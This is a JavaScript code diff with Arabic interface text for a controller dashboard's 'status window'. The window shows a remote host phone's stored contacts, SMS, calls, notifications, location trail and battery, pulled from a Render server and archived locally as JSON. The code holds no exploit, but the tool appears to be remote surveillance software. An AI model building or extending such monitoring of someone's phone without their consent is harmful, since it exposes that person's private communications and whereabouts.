+                const el = document.getElementById('rb-host-snapshot-modal');
+                el.classList.replace('hidden', 'flex');
+                const rec = savedHosts.get(deviceId);
+                const name = rec && rec.deviceName ? rec.deviceName : deviceId;
+                el.innerHTML = `<div class="bg-slate-900 border border-slate-700 rounded-2xl p-6 text-sm text-slate-300">⏳ جارٍ جلب بيانات نافذة الحالة من خادم Render...</div>`;
+                let snap = null;
+                try {
+                    const base = serverStateApiBase();
+                    const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(deviceId));
+                    if (res.ok) snap = await res.json();
+                } catch (_) {}
+                const d = (snap && snap.data) || {};
+                const lastTs = (snap && snap.ts) || d.lastSeen || (rec && rec.lastSeenAt) || 0;
+                const lastSeen = lastTs ? recFmtDate(lastTs) : 'غير معروف';
+                const battery = (snap && snap.batteryLevel !== undefined && snap.batteryLevel >= 0 ? snap.batteryLevel : (d.batteryLevel !== undefined ? d.batteryLevel : -1));
                 const counts = {
                     contacts: (d.contacts || []).length,
                     sms: (d.sms || []).length,
@@ -5943,38 +6311,79 @@
                     notifications: (d.notifications || []).length,
                     location: (d.location || []).length
                 };
+                const snapEmpty = !snap || !snap.data || (!counts.contacts && !counts.sms && !counts.calls && !counts.notifications && !counts.location);
+                const arch = deviceArchive.get(deviceId);
+                const archCounts = (() => {
+                    if (!arch || !arch.lists) return [];
+                    return Object.keys(ARCH_LIST_LABELS).filter(k => arch.lists[k] && Array.isArray(arch.lists[k].items) && arch.lists[k].items.length)
+                        .map(k => `${ARCH_LIST_LABELS[k][0]}${arch.lists[k].items.length}`).join(' ');
+                })() || '';
                 el.innerHTML = `
-                    <div class="bg-slate-900 border border-slate-700 rounded-2xl p-4 w-full max-w-md shadow-2xl">
+                    <div class="bg-slate-900 border border-slate-700 rounded-2xl p-4 w-full max-w-lg shadow-2xl max-h-[86vh] overflow-y-auto">
                         <div class="flex items-center justify-between mb-3">
-                            <h3 class="text-sm font-bold text-emerald-300">💾 الحالة المخزنة على الخادم</h3>
-                            <button onclick="closeHostSnapshotModal()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
+                            <h3 class="text-sm font-bold text-emerald-300">🛡️ نافذة الحالة — ${escHtml(String(name))}</h3>
+                            <button onclick="closeHostStatusWindow()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
                         </div>
                         <div class="text-xs text-slate-300 grid grid-cols-2 gap-2">
-                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🔋 البطارية: <b class="${battery <= 15 ? 'text-rose-300' : 'text-emerald-300'}">${battery >= 0 ? battery + '%' + (snap.isCharging || d.isCharging ? ' ⚡' : '') : 'غير معروفة'}</b></div>
                             <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📅 آخر رؤية: <b>${lastSeen}</b></div>
-                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">👥 جهات اتصال محفوظة: <b>${counts.contacts}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🕒 وقت المنقضي: <b id="rb-sw-elapsed" class="ts-en">${lastTs ? fmtElapsedAr(Date.now() - lastTs) : '—'}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🔋 البطارية: <b class="${battery <= 15 ? 'text-rose-300' : 'text-emerald-300'}">${battery >= 0 ? battery + '%' + (snap && (snap.isCharging || d.isCharging) ? ' ⚡' : '') : 'غير معروفة'}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">👥 جهات اتصال: <b>${counts.contacts}</b></div>
                             <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">💬 رسائل: <b>${counts.sms}</b></div>
                             <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📞 مكالمات: <b>${counts.calls}</b></div>
                             <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🔔 إشعارات: <b>${counts.notifications}</b></div>
-                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2 col-span-2">📍 نقاط المواقع: <b>${counts.location}</b></div>
+                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📍 نقاط المواقع: <b>${counts.location}</b></div>
                         </div>
-                        <div class="flex gap-2 mt-3">
-                            <button id="rb-snap-map" class="flex-1 bg-teal-700 hover:bg-teal-600 text-teal-50 text-xs font-bold py-2.5 rounded-xl transition">🗺️ مسار المواقع المخزن</button>
-                            <button onclick="closeHostSnapshotModal()" class="bg-slate-700 hover:bg-slate-600 text-slate-200 text-xs font-bold py-2.5 rounded-xl transition px-4">إغلاق</button>
+                        ${snapEmpty ? `<p class="text-[10px] text-amber-300/80 mt-2">لا حالة مخزنة على الخادم بعد — يصل التحديث تلقائياً كل 3 دقائق أثناء عمل المضيف، وتبقى بيانات تصفح الملفات مخزنة في ذاكرة الخادم حتى بعد انقطاعه.</p>` : ''}
+                        <div class="space-y-2 mt-3">
+                            <button id="rb-sw-map" class="w-full bg-teal-700 hover:bg-teal-600 text-teal-50 text-xs font-bold py-2.5 rounded-xl transition">🗺️ مسار المواقع المخزن على الخادم</button>
+                            <button id="rb-sw-blobs" class="w-full bg-purple-900/70 hover:bg-purple-800/90 text-purple-200 border border-purple-500/40 text-xs font-bold py-2.5 rounded-xl transition">🗂️ تصفح بيانات ذاكرة خادم Render (رُفعت أثناء اتصال المضيف وغير اتصال المتحكم)</button>
+                            ${archCounts ? `
+                            <div class="bg-emerald-950/40 border border-emerald-500/30 rounded-xl p-2.5">
+                                <p class="text-[11px] text-emerald-200 font-bold">📁 نسخة محفوظة تلقائياً في ملفات المتحكم <span class="text-[9px] text-emerald-400/80 font-mono">(${archCounts})</span></p>
+                                <p class="text-[9px] text-slate-400 mt-0.5">سُجلت أثناء جلسة اتصال المضيف والمتحكم معاً — <span class="ts-en">${fmtEnTime(arch.ts || 0)}</span></p>
+                                <div class="flex gap-1.5 mt-1.5">
+                                    <button id="rb-sw-arch" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 text-[10px] font-bold py-1.5 rounded-lg px-2">👀 تصفح النسخة المحلية</button>
+                                    <button id="rb-sw-arch-dl" class="bg-emerald-900/70 hover:bg-emerald-800 text-emerald-300 text-[10px] font-bold py-1.5 rounded-lg px-2">⬇️ تنزيل JSON</button>
+                                </div>
+                            </div>` : `<p class="text-[9px] text-slate-500 mt-1">أرشفة محلية: تُسجل نسخة القوائم تلقائياً في ملفات المتحكم عند اتصال المضيف والمتحكم بنفس الجلسة — للتصفح لاحقاً حتى بعد انقطاع الطرفين.</p>`}
                         </div>
+                        <button onclick="closeHostStatusWindow()" class="w-full mt-3 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold py-2.5 rounded-xl transition">إغلاق</button>
                     </div>`;
-                const mapBtn = el.querySelector('#rb-snap-map');
+                rbStartStatusElapsed(lastTs);
+                const mapBtn = el.querySelector('#rb-sw-map');
                 if (mapBtn) mapBtn.addEventListener('click', () => {
-                    closeHostSnapshotModal();
-                    setTimeout(() => openLocationMapView(d), 60);
+                    closeHostStatusWindow();
+                    setTimeout(() => openLocationMapView(Object.keys(counts).some(k => counts[k] > 0) ? d : undefined), 60);
                 });
+                const blobsBtn = el.querySelector('#rb-sw-blobs');
+                if (blobsBtn) blobsBtn.addEventListener('click', () => {
+                    closeHostStatusWindow();
+                    setTimeout(() => openVaultBlobsPanel(deviceId).catch(() => {}), 60);
+                });
+                const archBtn = el.querySelector('#rb-sw-arch');
+                if (archBtn) archBtn.addEventListener('click', () => {
+                    closeHostStatusWindow();
+                    setTimeout(() => renderDeviceArchivePanel(deviceId), 60);
+                });
+                const archDl = el.querySelector('#rb-sw-arch-dl');
+                if (archDl) archDl.addEventListener('click', () => downloadDeviceArchiveJson(deviceId));
             } catch (_) {
-                el.innerHTML = `<div class="bg-slate-900 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center">
-                    <p class="text-sm text-slate-300 mb-2">لا توجد حالة مخزنة لهذا الجهاز على الخادم بعد.</p>
-                    <p class="text-[11px] text-slate-500">سيدفع المضيف لقطة كل 3 دقائق عندما يعمل — وبعدها تبقى متاحة هنا حتى لو انقطع.</p>
-                    <button onclick="closeHostSnapshotModal()" class="mt-3 bg-slate-700 hover:bg-slate-600 text-slate-200 text-xs font-bold py-2 rounded-xl px-4">إغلاق</button>
-                </div>`;
+                try {
+                    const el = document.getElementById('rb-host-snapshot-modal');
+                    if (el) el.classList.replace('flex', 'hidden');
+                    showToast('تعذر فتح نافذة الحالة', 'error');
+                } catch (__) {}
             }
+        }
+
+        function closeHostStatusWindow() {
+            closeHostSnapshotModal();
+        }
+
+        // توافق خلفي: زر «الحالة» القديم إن وُجد يستدعي نفس نافذة الحالة
+        function openHostSnapshotModal(deviceId) {
+            try { return openHostStatusWindow(deviceId); } catch (_) {}
         }
 
         function closeHostSnapshotModal() {
